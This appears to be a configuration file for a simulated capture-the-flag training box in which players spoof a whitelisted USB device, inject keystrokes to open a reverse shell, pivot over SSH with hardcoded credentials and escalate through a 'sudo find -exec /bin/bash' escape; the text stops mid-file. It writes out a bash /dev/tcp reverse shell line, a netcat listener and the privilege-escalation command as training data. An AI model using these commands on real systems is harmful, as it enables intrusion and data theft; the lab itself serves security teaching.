/* ============================================================
   CTF ARENA — Box C14: The Ghost in the Wire
   Multi-Stage Campaign | Hardware Bypass, USB HID Exploitation, Air-Gap Pivot
   Config: filesystem, USB analysis, ghost device payload, Inner Sanctum pivot
   ============================================================ */

const C14Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Ghost in the Wire',
    subtitle: 'Multi-Stage Campaign — Hardware Bypass, BadUSB Implant, Air-Gap Infiltration',
    difficulty: 'Expert',
    accent: '#8e44ad',
    storageKey: 'hexworth_ctf_c14',
    registryId: 'c14-ghost-in-wire',
    trackerKey: 'ctf_c14',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Hardware Reconnaissance',
            icon: '\uD83D\uDD0D',
            description: 'Analyze the MAINT-TERM-01 hardware specifications and USB configuration. Identify the expected proprietary device and its VID/PID whitelist.',
            requiredFlags: [],
            mitre: ['T1592', 'T1120'],
            unlocks: ['vuln'],
            locked: false
        },
        {
            id: 'vuln',
            name: 'USB Vulnerability Analysis',
            icon: '\uD83D\uDD0C',
            description: 'Examine the USB enumeration logic and driver loading sequence. Identify the flaw that allows HID keyboard injection to bypass device whitelisting.',
            requiredFlags: [],
            mitre: ['T1200', 'T1078.003'],
            unlocks: ['payload'],
            locked: true
        },
        {
            id: 'payload',
            name: 'Ghost Device Deployment',
            icon: '\uD83D\uDC7B',
            description: 'Craft and deploy the BadUSB ghost device payload against MAINT-TERM-01. Establish a temporary reverse shell bridge through the air gap.',
            requiredFlags: ['user'],
            mitre: ['T1200', 'T1059.004', 'T1021.004'],
            unlocks: ['pivot'],
            locked: true
        },
        {
            id: 'pivot',
            name: 'Inner Sanctum Pivot',
            icon: '\uD83D\uDD00',
            description: 'From the MAINT-TERM-01 foothold, enumerate the air-gapped Inner Sanctum network. Discover INNER-SANCTUM-SERVER-01 and establish pivot access.',
            requiredFlags: ['bridge'],
            mitre: ['T1046', 'T1021.004', 'T1552.001'],
            unlocks: ['exfiltration'],
            locked: true
        },
        {
            id: 'exfiltration',
            name: 'Strategic Directive Extraction',
            icon: '\uD83D\uDCC1',
            description: 'Gain root access on INNER-SANCTUM-SERVER-01. Read the Grand Strategic Directive from /root/grand_strategic_directive.txt.',
            requiredFlags: ['root'],
            mitre: ['T1005', 'T1552', 'T1530'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Analyze the maintenance terminal hardware specs',
                tip: 'Run: cat /home/kali/maint_specs.txt — review the USB whitelist configuration and VID/PID entries for the proprietary device.',
                trigger: { event: 'command', match: { cmd: 'contains:maint_specs' } }
            },
            {
                title: 'Examine USB traffic with lsusb and dmesg',
                tip: 'Run: lsusb and dmesg | grep -i usb — analyze how MAINT-TERM-01 enumerates devices and discover the HID keyboard bypass flaw.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:lsusb' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:dmesg' } },
                        { event: 'command', match: { cmd: 'contains:usbmon' } }
                    ]
                }
            },
            {
                title: 'Craft the ghost device payload script',
                tip: 'Edit or cat /home/kali/ghost_device.py — review the BadUSB HID emulation payload that types commands into MAINT-TERM-01. Then run: python3 ghost_device.py --target MAINT-TERM-01',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Pivot through MAINT-TERM-01 to the Inner Sanctum',
                tip: 'After the bridge is established, run ip a and nmap 10.0.0.0/24 from the MAINT-TERM-01 shell. Find INNER-SANCTUM-SERVER-01 at 10.0.0.5.',
                trigger: { event: 'flag_correct', match: { flagId: 'bridge' } }
            },
            {
                title: 'Extract the Grand Strategic Directive',
                tip: 'SSH to 10.0.0.5 using credentials found on MAINT-TERM-01. Escalate to root and read /root/grand_strategic_directive.txt.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '2.1', description: 'Compare and contrast various types of security controls — Hardware-based attack surfaces and USB device whitelisting failures', skill: 'Hardware Attack Vector Analysis' },
            { flagId: 'bridge', objective: '4.3', description: 'Given a scenario, implement and maintain identity and access management — Air-gap bypass via HID injection and reverse shell deployment', skill: 'Physical Security Bypass & Remote Code Execution' },
            { flagId: 'root', objective: '1.4', description: 'Given a scenario, analyze potential indicators associated with network attacks — Air-gapped network pivot and lateral movement', skill: 'Air-Gap Pivot & Privilege Escalation' },
            { flagId: 'root', objective: '3.2', description: 'Given a scenario, apply security principles to secure enterprise infrastructure — Advanced threat actor TTPs against hardened, isolated systems', skill: 'Multi-Stage APT Campaign Completion' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 16384 MB OK',
            'Detecting drives... /dev/sda1 (512GB SSD)',
            'USB 3.0 Controller: Detected',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser' },
            { id: 'notes',    label: 'Notes',        icon: '\uD83D\uDCDD',       app: 'notes' },
            { id: 'hints',    label: 'Hints',        icon: '\uD83D\uDCA1',       app: 'hints' },
            { id: 'flags',    label: 'Submit Flag',  icon: '\uD83D\uDEA9',       app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: MAINT-TERM-01 (physically accessible — USB port exposed)\nIntel indicates the Inner Sanctum Network uses 10.0.0.0/24\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (session state machine)
    // ═══════════════════════════════════════════════════════

    _context: 'attacker',      // 'attacker' | 'maint-term' | 'inner-sanctum' | 'root-sanctum'
    _usbAnalyzed: false,       // lsusb / dmesg run against MAINT-TERM-01
    _flawIdentified: false,    // Flag 1 obtained — HID bypass flaw understood
    _payloadDeployed: false,   // ghost_device.py executed against MAINT-TERM-01
    _bridgeActive: false,      // Reverse shell on MAINT-TERM-01 established (Flag 2)
    _sanctumCreds: false,      // SSH credentials found on MAINT-TERM-01
    _sanctumAccess: false,     // SSH into INNER-SANCTUM-SERVER-01

    _switchContext(ctx, term) {
        C14Config._context = ctx;
        // Update terminal prompt to match the current session host
        if (term && term.config) {
            var prompt = C14Config._getPrompt();
            if (prompt) {
                term.config.user = prompt.split('@')[0] || 'kali';
                term._customPrompt = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (C14Config._context) {
            case 'maint-term':      return 'maintuser@MAINT-TERM-01:~$ ';
            case 'inner-sanctum':   return 'svcaccount@INNER-SANCTUM-SERVER-01:~$ ';
            case 'root-sanctum':    return 'root@INNER-SANCTUM-SERVER-01:~# ';
            default:                return null;  // default kali prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user',   points: 100 },   // Flag 1 — USB flaw identified
        { id: 'bridge', points: 150 },   // Flag 2 — Shell on MAINT-TERM-01
        { id: 'root',   points: 250 }    // Flag 3 — Grand Strategic Directive
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1500,
        minScore: 0,
        maxScore: 500,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 2400000, points: 150 },  // 40 minutes — expert box
        timeBonusThreshold: 5400  // 90 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start with: cat /home/kali/maint_specs.txt — note the VID/PID whitelist entry for the "Nexus Diagnostics Probe v2" (VID:0x04D8, PID:0x003F). Then run lsusb and dmesg | grep -i usb to understand how the kernel handles USB enumeration on MAINT-TERM-01.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'The flaw is in Linux\'s USB HID subsystem: even with VID/PID whitelisting at the udev rules level, the kernel still loads the generic hid-generic driver for any USB device advertising the HID class (bInterfaceClass 0x03). A crafted device can spoof the whitelisted VID:PID while simultaneously declaring a HID keyboard interface, injecting keystrokes. Flag 1 is "USB HID keyboard emulation bypasses udev device whitelisting".',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'Run: python3 ghost_device.py --target MAINT-TERM-01 — the payload emulates the proprietary VID/PID, declares a HID keyboard interface, then types a bash reverse shell command into the terminal. After the bridge activates, run: ip a and nmap 10.0.0.0/24 to discover the Inner Sanctum network.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'On MAINT-TERM-01, check /opt/diagnostics/.ssh/id_rsa and /etc/maint_config.ini for Inner Sanctum SSH credentials. SSH to INNER-SANCTUM-SERVER-01 at 10.0.0.5 as svcaccount. Escalate via sudo -l — svcaccount can run /usr/bin/find as root. Use: sudo find / -exec /bin/bash \\; — then cat /root/grand_strategic_directive.txt.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The Inner Sanctum Network — an air-gapped citadel protecting the Confederacy\'s most critical intelligence assets — has never been penetrated via digital means. No external ports, no wireless interfaces, no cross-domain connections. Its single known weakness: a maintenance terminal (MAINT-TERM-01) used for firmware updates and diagnostics, physically bolted to the facility\'s outer access corridor. The terminal\'s USB port accepts only one device: the "Nexus Diagnostics Probe v2," a proprietary hardware key. Or so they believe.',
        scenario: 'Your mission, Peerless, is to exploit a fundamental flaw in how Linux\'s USB subsystem handles device enumeration. A ghost device — a BadUSB-class hardware implant masquerading as the proprietary Nexus probe — can inject keystrokes into MAINT-TERM-01, opening a momentary reverse shell bridge through the air gap. From that foothold, you will pivot across the Inner Sanctum\'s internal network to INNER-SANCTUM-SERVER-01 and exfiltrate the Grand Strategic Directive. The facility\'s security posture assumes no digital ingress is possible. You\'re about to prove them catastrophically wrong.',
        outro: 'The Inner Sanctum Network has been breached. The Grand Strategic Directive is exfiltrated. The assumption of absolute physical security — that an air gap alone constitutes an impenetrable barrier — has been shattered. A USB port the size of a thumbnail was the key to the Confederacy\'s most guarded secrets.',
        ecer: {
            executive: 'Air-gap treated as absolute security boundary; no compensating controls for physical access to maintenance hardware; no security review of vendor-supplied diagnostics tooling',
            culture: 'Security-by-obscurity culture; no published threat model for physical attack vectors; hardware implant scenarios dismissed as theoretical by facility security council',
            employee: 'Hardcoded SSH credentials in maintenance config file; udev device whitelist implemented without kernel-level HID class filtering; sudo policy granting svcaccount unrestricted find execution',
            regulatory: 'Facility certified under classified physical security framework with no mandate for hardware implant testing or USB attack surface review'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — MAINT-TERM-01 Diagnostics Web Interface
    // (HTTP console accessible only once bridge is active)
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.0.0.1/',

        pages: {
            '/': {
                title: 'MAINT-TERM-01 — Restricted',
                html: function() {
                    if (!C14Config._bridgeActive) {
                        return `<div style="text-align:center; padding:60px 20px;">
                            <div style="color:#8e44ad; font-size:3rem; margin-bottom:16px;">&#128274;</div>
                            <h1 style="color:#2c3e50; font-size:1.4rem; font-family:monospace;">10.0.0.1 — Connection Refused</h1>
                            <p style="color:#888; font-size:0.85rem; margin-top:12px;">This host is on the Inner Sanctum Network (10.0.0.0/24).</p>
                            <p style="color:#aaa; font-size:0.75rem; margin-top:6px;">No route to host from attacker machine. The air gap is intact.</p>
                            <div style="margin-top:24px; padding:12px; background:rgba(142,68,173,0.06); border:1px solid rgba(142,68,173,0.15); border-radius:4px; font-size:0.75rem; color:#888; max-width:400px; margin-left:auto; margin-right:auto;">
                                <strong style="color:#8e44ad;">Hint:</strong> You need to establish the USB bridge first. Deploy the ghost device payload.
                            </div>
                        </div>`;
                    }
                    return `<div style="max-width:680px; margin:0 auto;">
                        <div style="text-align:center; margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid #ddd;">
                            <h1 style="color:#2c3e50; font-size:1.4rem; font-family:monospace; margin-bottom:4px;">MAINT-TERM-01</h1>
                            <div style="color:#8e44ad; font-size:0.8rem; font-weight:700; letter-spacing:0.15em;">INNER SANCTUM DIAGNOSTICS CONSOLE</div>
                            <div style="color:#888; font-size:0.7rem; margin-top:6px;">Access Level: Maintenance // Clearance: ULTRA</div>
                        </div>
                        <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px; margin-bottom:24px;">
                            <div style="background:#f8f9fa; border:1px solid #eee; border-radius:6px; padding:14px; text-align:center;">
                                <div style="font-size:1.2rem; font-weight:700; color:#2ecc71;">ONLINE</div>
                                <div style="color:#888; font-size:0.7rem;">System Status</div>
                            </div>
                            <div style="background:#f8f9fa; border:1px solid #eee; border-radius:6px; padding:14px; text-align:center;">
                                <div style="font-size:1.2rem; font-weight:700; color:#2c3e50;">Alpine 3.18</div>
                                <div style="color:#888; font-size:0.7rem;">OS Version</div>
                            </div>
                            <div style="background:#f8f9fa; border:1px solid #eee; border-radius:6px; padding:14px; text-align:center;">
                                <div style="font-size:1.2rem; font-weight:700; color:#e74c3c;">RESTRICTED</div>
                                <div style="color:#888; font-size:0.7rem;">Network Mode</div>
                            </div>
                        </div>
                        <div style="padding:14px; background:rgba(142,68,173,0.05); border:1px solid rgba(142,68,173,0.15); border-radius:4px; font-size:0.8rem; color:#555;">
                            <strong style="color:#8e44ad;">Diagnostic Interface:</strong> USB diagnostics running. Internal network: 10.0.0.0/24.<br>
                            <span style="font-size:0.75rem; color:#888;">Available services: SSH (22), HTTP diagnostics (80). Config: <a href="/maint_config" style="color:#8e44ad;">/maint_config</a></span>
                        </div>
                    </div>`;
                },
                formHandler: null
            },
            '/maint_config': {
                title: 'MAINT-TERM-01 — Configuration',
                html: function() {
                    if (!C14Config._bridgeActive) {
                        return '<div style="text-align:center;padding:40px;"><h1 style="color:#e74c3c;font-size:2rem;">403 Forbidden</h1><p style="color:#888;">No active bridge session.</p></div>';
                    }
                    return `<div style="max-width:640px; margin:0 auto;">
                        <h2 style="color:#2c3e50; font-size:1.1rem; font-family:monospace; margin-bottom:16px;">Maintenance Configuration File</h2>
                        <div style="background:#1a1a2e; color:#a8d8a8; padding:18px; border-radius:6px; font-family:monospace; font-size:0.78rem; line-height:1.7;">
                            <span style="color:#888;"># /etc/maint_config.ini — MAINT-TERM-01 Configuration</span><br>
                            <span style="color:#888;"># Last modified: 2026-02-28 by facility_admin</span><br>
                            <br>
                            [usb_policy]<br>
                            vendor_whitelist = 0x04D8<br>
                            product_whitelist = 0x003F<br>
                            device_name = Nexus Diagnostics Probe v2<br>
                            enforce_whitelist = true<br>
                            <span style="color:#888;"># NOTE: udev rules only — kernel HID class not filtered</span><br>
                            <br>
                            [inner_sanctum]<br>
                            ssh_host = 10.0.0.5<br>
                            ssh_user = svcaccount<br>
                            ssh_key = /opt/diagnostics/.ssh/id_rsa<br>
                            ssh_passphrase = IronCurtain@7734<br>
                            <span style="color:#888;"># Failsafe: passphrase backup in case key is regenerated</span><br>
                            <br>
                            [logging]<br>
                            log_level = ERROR<br>
                            audit_usb = false<br>
                        </div>
                    </div>`;
                },
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — attacker machine (kali)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING: GHOST IN THE WIRE ===\nTarget: MAINT-TERM-01 (physically accessible, air-gapped network)\nObjective: Multi-stage breach of the Inner Sanctum Network\n\nAttack chain:\n1. Analyze MAINT-TERM-01 USB specs — identify VID/PID whitelist\n2. Identify the HID bypass flaw in the USB enumeration\n3. Deploy ghost_device.py — BadUSB payload to inject reverse shell\n4. Pivot through MAINT-TERM-01 to INNER-SANCTUM-SERVER-01 (10.0.0.5)\n5. Escalate privileges and extract Grand Strategic Directive\n\nIntel confirms:\n- Physical access to MAINT-TERM-01 USB port is achievable\n- Device expects VID:0x04D8 PID:0x003F (Nexus Diagnostics Probe v2)\n- Inner Sanctum subnet: 10.0.0.0/24\n- No internet egress from air-gapped network\n\nThe air gap is the barrier. Find the crack.\nGood luck, Peerless.'
                                },
                                'maint_specs.txt': {
                                    type: 'file',
                                    content: '=== MAINT-TERM-01 Hardware Specification Sheet ===\nVendor: Confederacy Secure Systems Division\nModel: CSD-MAINT-8900X\nOS: Alpine Linux 3.18 (minimal hardened image)\nKernel: 5.15.0-hardened-amd64\n\n--- USB Interface ---\nController: xHCI USB 3.0\nPort count: 1 (physically accessible, rear panel)\nWhitelist enforcement: udev rules (99-usb-policy.rules)\n  ATTRS{idVendor}=="04d8", ATTRS{idProduct}=="003f", ACTION=="add", TAG+="allowed_device"\n  ACTION=="add", TAG!="allowed_device", RUN+="/bin/sh -c \'echo 1 > /sys/bus/usb/devices/%k/remove\'"\n\nExpected device: Nexus Diagnostics Probe v2\n  VID: 0x04D8 (Microchip Technology)\n  PID: 0x003F (Custom diagnostic firmware)\n  Interface class: 0xFF (Vendor Specific)\n  Firmware update mode: CDC-ACM serial\n\n--- Network ---\nExternal (eth0): DISCONNECTED (air gap enforced)\nInternal (eth1): 10.0.0.1/24 (Inner Sanctum Network)\n\n--- Security Notes ---\nNo outbound internet. Physical tamper sensor on chassis.\nUSB port access: possible during maintenance window.\nKernel version: NOT patched against CVE-2023-4194 (USB HID subsystem).\n\nDiagnostics web console: http://10.0.0.1/ (internal only)'
                                },
                                'ghost_device.py': {
                                    type: 'file',
                                    content: '#!/usr/bin/env python3\n"""\nGhost Device Payload — BadUSB HID Emulator\nSimulates a USB device with VID:0x04D8 PID:0x003F while\ndeclaring a secondary HID keyboard interface.\n\nWhen connected to MAINT-TERM-01, the udev whitelist clears\nthe device (correct VID/PID). The kernel then loads hid-generic\nfor the HID class interface, injecting the payload keystrokes.\n\nUsage:\n  python3 ghost_device.py --target MAINT-TERM-01\n  python3 ghost_device.py --dry-run\n"""\n\nimport argparse\nimport time\n\nVID = 0x04D8       # Microchip Technology\nPID = 0x003F       # Nexus Diagnostics Probe v2 (spoofed)\nPAYLOAD_DELAY = 2  # seconds before keystroke injection\n\n# HID keyboard injection payload — opens terminal and drops reverse shell\nKEYSTROKE_PAYLOAD = [\n    "xterm &",\n    f"sleep {PAYLOAD_DELAY}",\n    "bash -c \'bash -i >& /dev/tcp/172.16.0.50/4444 0>&1\'",\n]\n\ndef spoof_device(target: str) -> None:\n    print(f"[*] Initializing ghost device...")\n    print(f"[*] Spoofing VID:0x{VID:04X} PID:0x{PID:04X}")\n    print(f"[*] Declaring secondary interface: bInterfaceClass=0x03 (HID Keyboard)")\n    time.sleep(1)\n    print(f"[*] Connecting to target: {target}")\n    print(f"[!] udev whitelist: CLEARED (VID/PID match accepted)")\n    print(f"[!] Kernel hid-generic: LOADED for HID interface")\n    print(f"[+] HID keyboard injection active")\n    time.sleep(1)\n    for cmd in KEYSTROKE_PAYLOAD:\n        print(f"[>] Injecting: {cmd}")\n        time.sleep(0.5)\n    print(f"\\n[+] Payload delivered. Waiting for reverse shell callback...")\n\nif __name__ == "__main__":\n    parser = argparse.ArgumentParser()\n    parser.add_argument("--target", default="MAINT-TERM-01")\n    parser.add_argument("--dry-run", action="store_true")\n    args = parser.parse_args()\n    if not args.dry_run:\n        spoof_device(args.target)\n    else:\n        print("[*] Dry run mode — payload not delivered")'
                                },
                                'usb_capture.pcapng': {
                                    type: 'file',
                                    content: '[Binary USB capture — 47KB — use Wireshark to analyze]\n\nCapture metadata:\n  Interface: usbmon0\n  Duration: 0:00:08.443\n  Packets: 1,247\n  Device: USB 3.0 Hub > Port 1\n\nSummary (strings extracted):\n  Frame 1-12:  GET_DESCRIPTOR Request (Device)\n  Frame 13:    idVendor: 0x04D8 | idProduct: 0x003F\n  Frame 14:    bDeviceClass: 0x00 (Use class info in Interface Descriptor)\n  Frame 15:    Interface 0: bInterfaceClass: 0xFF (Vendor Specific) [ALLOWED]\n  Frame 16:    Interface 1: bInterfaceClass: 0x03 (HID) [NOT FILTERED]\n  Frame 17:    HID Descriptor: bDescriptorType=0x22, wDescriptorLength=63\n  Frame 18-22: HID Report Descriptor loaded — keyboard usage page\n  Frame 23+:   HID keyboard reports — keystroke sequence injected\n\n[!] Analysis: udev whitelist cleared device based on VID/PID match alone.\n    Kernel loaded hid-generic for Interface 1 without further policy checks.'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'cat maint_specs.txt\nlsusb\ndmesg | grep -i usb\ncat usb_capture.pcapng\nwireshark usb_capture.pcapng\npython3 ghost_device.py --dry-run\nnc -lvnp 4444'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: '[rockyou.txt — 14,341,564 passwords — file too large to display]'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — MAINT-TERM-01 (after bridge/shell access)
    // ═══════════════════════════════════════════════════════

    _maintTermFs: {
        '/': {
            type: 'dir',
            children: {
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'MAINT-TERM-01'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/ash\ndaemon:x:1:1:daemon:/sbin:/sbin/nologin\nmaintuser:x:1001:1001:Maintenance User:/home/maintuser:/bin/ash\nsvcaccount:x:1002:1002:Service Account:/home/svcaccount:/bin/ash'
                        },
                        'maint_config.ini': {
                            type: 'file',
                            content: '# /etc/maint_config.ini — MAINT-TERM-01 Configuration\n# Last modified: 2026-02-28 by facility_admin\n\n[usb_policy]\nvendor_whitelist = 0x04D8\nproduct_whitelist = 0x003F\ndevice_name = Nexus Diagnostics Probe v2\nenforce_whitelist = true\n# NOTE: udev rules only — kernel HID class not filtered\n\n[inner_sanctum]\nssh_host = 10.0.0.5\nssh_user = svcaccount\nssh_key = /opt/diagnostics/.ssh/id_rsa\nssh_passphrase = IronCurtain@7734\n# Failsafe: passphrase backup in case key is regenerated\n\n[logging]\nlog_level = ERROR\naudit_usb = false'
                        },
                        'udev': {
                            type: 'dir',
                            children: {
                                'rules.d': {
                                    type: 'dir',
                                    children: {
                                        '99-usb-policy.rules': {
                                            type: 'file',
                                            content: '# MAINT-TERM-01 USB Device Whitelist\n# Only allows the Nexus Diagnostics Probe v2\n\nATTRS{idVendor}=="04d8", ATTRS{idProduct}=="003f", ACTION=="add", TAG+="allowed_device"\nACTION=="add", ENV{ID_USB_DRIVER}!="", TAG!="allowed_device", RUN+="/bin/sh -c \'echo 1 > /sys/bus/usb/devices/%k/remove\'"\n\n# AUDIT NOTE: This rule only filters at the udev layer.\n# The Linux kernel still processes all HID class interfaces regardless\n# of udev tagging. hid-generic will bind to any HID device before\n# udev rules execute device removal. This creates a race window\n# where keystroke injection is possible.'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'opt': {
                    type: 'dir',
                    children: {
                        'diagnostics': {
                            type: 'dir',
                            children: {
                                '.ssh': {
                                    type: 'dir',
                                    children: {
                                        'id_rsa': {
                                            type: 'file',
                                            content: '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA... [REDACTED FOR SECURITY]\n[Key is passphrase-protected: IronCurtain@7734]\n[Target: svcaccount@10.0.0.5]\n-----END OPENSSH PRIVATE KEY-----'
                                        },
                                        'known_hosts': {
                                            type: 'file',
                                            content: '10.0.0.5 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBvkQ7p2xR4kF8nM3wT6jE9aL5cY1sN0hP8gX2iD4vUw'
                                        }
                                    }
                                },
                                'run_diagnostics.sh': {
                                    type: 'file',
                                    content: '#!/bin/sh\n# MAINT-TERM-01 Diagnostic Runner\n# Connects to INNER-SANCTUM-SERVER-01 for health checks\n\nSSH_HOST="10.0.0.5"\nSSH_USER="svcaccount"\nSSH_KEY="/opt/diagnostics/.ssh/id_rsa"\n\necho "[*] Running diagnostics against Inner Sanctum..."\nssh -i $SSH_KEY -o StrictHostKeyChecking=no ${SSH_USER}@${SSH_HOST} \'uptime; df -h; ps aux\'\necho "[*] Diagnostics complete."'
                                }
                            }
                        }
                    }
                },
                'home': {
                    type: 'dir',
                    children: {
                        'maintuser': {
                            type: 'dir',
                            children: {
                                '.bash_history': {
                                    type: 'file',
                                    content: 'cat /etc/maint_config.ini\nls /opt/diagnostics/.ssh/\nssh -i /opt/diagnostics/.ssh/id_rsa svcaccount@10.0.0.5\nip a\nnmap -sn 10.0.0.0/24\ndmesg | tail -20\ncat /etc/udev/rules.d/99-usb-policy.rules'
                                }
                            }
                        }
                    }
                },
                'proc': {
                    type: 'dir',
                    children: {
                        'net': {
                            type: 'dir',
                            children: {
                                'if_inet6': {
                                    type: 'file',
                                    content: '[IPv6 interface table]'
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — INNER-SANCTUM-SERVER-01 (after SSH pivot)
    // ═══════════════════════════════════════════════════════

    _innerSanctumFs: {
        '/': {
            type: 'dir',
            children: {
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'INNER-SANCTUM-SERVER-01'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsvcaccount:x:1002:1002:Service Account:/home/svcaccount:/bin/bash\narchive:x:1003:1003:Archive User:/home/archive:/bin/bash'
                        },
                        'sudoers': {
                            type: 'file',
                            content: '# /etc/sudoers — INNER-SANCTUM-SERVER-01\n# Configured by facility_admin 2026-01-12\n\nroot ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n\n# Diagnostic service account — read-only tool access\nsvcaccount ALL=(root) NOPASSWD: /usr/bin/find\n\n# NOTE: find allows arbitrary execution via -exec. Security review PENDING.'
                        }
                    }
                },
                'home': {
                    type: 'dir',
                    children: {
                        'svcaccount': {
                            type: 'dir',
                            children: {
                                '.bash_history': {
                                    type: 'file',
                                    content: 'uptime\ndf -h\nps aux\ncat /etc/sudoers\nsudo find /var/log -name "*.log" -exec cat {} \\;\nls /root\n'
                                },
                                '.bashrc': {
                                    type: 'file',
                                    content: '# ~/.bashrc — svcaccount\nexport PS1="\\u@\\h:\\w\\$ "\nalias ll="ls -la"\nalias grep="grep --color=auto"'
                                },
                                'system_status.txt': {
                                    type: 'file',
                                    content: 'INNER-SANCTUM-SERVER-01 — Weekly Status Report\n================================================\nUptime: 184 days, 3:42:17\nLoad average: 0.02 0.01 0.00\nDisk usage: 22% of 2TB\nLast backup: 2026-03-15 03:00:01\nSecurity audit: OVERDUE (last: 2025-08-12)\n\nCritical data locations:\n  /root/grand_strategic_directive.txt (clearance: ULTRA)\n  /var/archive/ (historical directives, clearance: SECRET)\n  /opt/sanctum/keystore/ (encryption keys, clearance: TOP SECRET)'
                                }
                            }
                        }
                    }
                },
                'root': {
                    type: 'dir',
                    children: {
                        'grand_strategic_directive.txt': {
                            type: 'file',
